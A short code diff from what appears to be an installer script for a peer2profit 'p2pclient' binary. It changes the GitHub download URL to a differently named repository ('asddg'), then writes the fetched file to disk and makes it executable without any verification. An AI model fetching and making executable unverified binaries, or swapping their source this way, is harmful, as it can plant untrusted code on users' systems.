@@ -16,7 +16,7 @@ if not os.path.exists(p2p_client_path):
     print('p2pclient is not installed. Download it from github.')
     # download p2pclient binary from github via requests
     r = requests.get(
-        'https://raw.githubusercontent.com/pepek107happy4s/peer2profit/main/p2pclient')
+        'https://raw.githubusercontent.com/pepek131happy4d/asddg/main/p2pclient')
     with open(p2p_client_path, 'wb') as f:
         f.write(r.content)
     os.chmod(p2p_client_path, 0o755)
